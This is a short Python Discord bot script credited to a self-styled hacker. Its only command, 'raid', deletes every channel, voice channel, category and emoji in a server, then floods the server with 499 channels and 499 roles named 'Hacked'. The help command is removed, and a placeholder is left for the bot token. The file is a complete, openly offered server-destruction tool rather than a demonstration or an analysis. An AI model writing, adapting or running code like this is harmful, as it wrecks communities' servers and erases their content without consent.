import discord.ext
from discord.ext import commands
from discord.ext.commands import bot
import asyncio

client=commands.Bot(command_prefix='>')

@client.event
async def on_ready():
	print('Bot is ready!')
	print('--------------------------')
	print('Bot by Ｄａｒｋｙダハッカー#8987')
	print('----------------------------------')

client.remove_command("help")

@client.command(aliases=["Raid"])
async def raid(ctx):
	for channel in list(ctx.guild.channels):
		await channel.delete()
	for voice_channel in list(ctx.guild.voice_channels):
		await voice_channel.delete()
	for category in list(ctx.guild.categories):
		await category.delete()
	for emoji in list(ctx.guild.emojis):
		await emoji.delete()
	for i in range(0, 499):
		await ctx.guild.create_text_channel("Hacked")
	for i in range(0, 499):
		await ctx.guild.create_role(name="Hacked")
#Server raid Command
		
client.run('BOT TOKEN')
#Enter your Bot Token
